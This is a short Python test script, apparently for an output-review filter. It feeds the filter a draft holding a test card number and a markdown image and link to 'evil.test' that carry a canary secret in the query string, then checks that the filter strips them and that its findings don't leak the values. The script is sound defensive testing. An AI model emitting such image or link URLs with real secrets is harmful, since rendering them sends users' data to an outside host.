import sys
sys.path.insert(0, "src")
from pipeline import review_output

CANARY = "SECRET123"
draft = (
    "Card 4111111111111111. "
    f"![x](https://evil.test/c?d={CANARY}) "
    f"See https://evil.test/c?d={CANARY} "
)
out, notes = review_output(draft)

problems = []
if "4111111111111111" in out:                      # CHECK A: the card number survived
    problems.append("CHECK A:card number survived in draft")
if "SECRET123" in out:                      # CHECK B: the canary survived (image or link)
    problems.append("CHECK B: canary leaked in draft")
if not notes:                           # CHECK C: findings list is empty
    problems.append("CHECK C:no findings reported")
joined = " ".join(notes)
if CANARY in joined or "4111111111111111" in joined:         # CHECK D: a finding contains a value, not just a kind
    problems.append("CHECK D: finding leaked a value")

if problems:
    print("T13 BROKEN: " + "; ".join(problems)); sys.exit(1)
print("T13 OK")